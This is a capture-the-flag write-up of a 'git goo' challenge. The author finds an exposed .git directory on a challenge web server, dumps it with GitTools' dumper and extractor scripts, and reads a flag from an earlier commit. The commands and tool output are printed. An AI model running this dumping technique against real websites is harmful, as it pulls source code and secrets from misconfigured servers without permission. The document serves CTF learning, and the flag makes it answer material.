# git goo

This challenge gave a link to a web page
>Can you find your way around a git reposotory [sic]?
`gitgoo.challs.pwnoh.io`

This web page was completely blank. I looked around in inspect element, to try and find some clue about what to do. I couldn't find anything, no network requests or other files.  

Based on the challenge description, I guessed that this was a git repository hosted to a web page. I knew that all git repositories have a /.git file, so I tried `gitgoo.challs.pwnoh.io/.git`

![Gitgoo Screenshot](/assets/gitgoo.png)

Now that I know I can access the `./git` folder, I looked up how this folder is organized. I found that a history of all committments could be found in `.git/logs/refs/heads/master`, so I tried that and found this.

![Gitgoo Screenshot](/assets/gitgoo.png)

I saw that in one of the past versions, the flag was accidentally uploaded. I looked up how to get past versions of the source code with the .git folder, and found [GitTools'](https://github.com/internetwache/GitTools) dumper and extractor tool.

```
$ bash ~/GitTool/Dumper/gitdumper.sh http://gitgoo.challs.pwnoh.io/.git/ ./dump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/39/1d507873dc7139d2420a8b492620db26912cdb
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/bc/97871a6f5453920882b0bbd97d8ac4fb2bcf9c
[+] Downloaded: objects/87/2e5099233f5d528ce3e60b4b197c9af17f784b
[+] Downloaded: objects/9b/474236ba20cf3f7d484b76348de51c819c0d65
[+] Downloaded: objects/7c/66dc0899a8bc61fb4775128363f6038cf0ddc6
[+] Downloaded: objects/7e/8a2b8a2ab84307eae435657c503c0b9f27af65
[+] Downloaded: objects/a4/68f07e26253bd5358684d39911f80c01e038a7
[+] Downloaded: objects/da/9c794745ce1c17844c0a03cb134e692d0f8353
[+] Downloaded: objects/7e/8cab9152f1e0689a48f210e679fb769284dea4
[+] Downloaded: objects/50/9dc2285f81184c13e362a2cd72a95382d54655
[+] Downloaded: objects/5a/ed32b539741d15880c69ab0cc7c72d26fb8ce7
[+] Downloaded: objects/1f/077205b3c88bda7cda44086dd0344494810ea2
```

This created a `.git` folder inside `./dump`, and now I can use the extractor to get the source code from the past commits

```
$ bash ~/GitTool/Extractor/extractor.sh ./ ./
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
[+] Found commit: bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//0-bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c/index.html
[+] Found commit: 391d507873dc7139d2420a8b492620db26912cdb
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//1-391d507873dc7139d2420a8b492620db26912cdb/.gitignore
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//1-391d507873dc7139d2420a8b492620db26912cdb/Dockerfile
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//1-391d507873dc7139d2420a8b492620db26912cdb/app.py
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//1-391d507873dc7139d2420a8b492620db26912cdb/index.html
[+] Found commit: 9b474236ba20cf3f7d484b76348de51c819c0d65
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//2-9b474236ba20cf3f7d484b76348de51c819c0d65/.gitignore
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//2-9b474236ba20cf3f7d484b76348de51c819c0d65/Dockerfile
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//2-9b474236ba20cf3f7d484b76348de51c819c0d65/app.py
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//2-9b474236ba20cf3f7d484b76348de51c819c0d65/index.html
[+] Found commit: 872e5099233f5d528ce3e60b4b197c9af17f784b
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//3-872e5099233f5d528ce3e60b4b197c9af17f784b/Dockerfile
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//3-872e5099233f5d528ce3e60b4b197c9af17f784b/app.py
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//3-872e5099233f5d528ce3e60b4b197c9af17f784b/flag.txt
[+] Found file: /home/kyle/OSUCyber/ctf24/misc/gitgoo/dump/.//3-872e5099233f5d528ce3e60b4b197c9af17f784b/index.html
$ ls -la
total 28
drwxr-xr-x 7 kyle kyle 4096 Oct 29 17:49 .
drwxr-xr-x 5 kyle kyle 4096 Oct 29 17:44 ..
drwxr-xr-x 6 kyle kyle 4096 Oct 29 17:44 .git
drwxr-xr-x 2 kyle kyle 4096 Oct 29 17:49 0-bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c
drwxr-xr-x 2 kyle kyle 4096 Oct 29 17:49 1-391d507873dc7139d2420a8b492620db26912cdb
drwxr-xr-x 2 kyle kyle 4096 Oct 29 17:49 2-9b474236ba20cf3f7d484b76348de51c819c0d65
drwxr-xr-x 2 kyle kyle 4096 Oct 29 17:49 3-872e5099233f5d528ce3e60b4b197c9af17f784b
```

Based on `.git/logs/refs/heads/master`, the folder that I wanted had the id `9b474236ba20cf3f7d484b76348de51c819c0d65`. For some reason it wasn't there, so I tried the next file.

```
$ cd 3-872e5099233f5d528ce3e60b4b197c9af17f784b/
$ ls
Dockerfile  app.py  commit-meta.txt  flag.txt  index.html
$ cat flag.txt
bctf{1_h4v3_c0mm17m3n7_i55u3s_cf39ab917a7dd092992a8f9b}
```

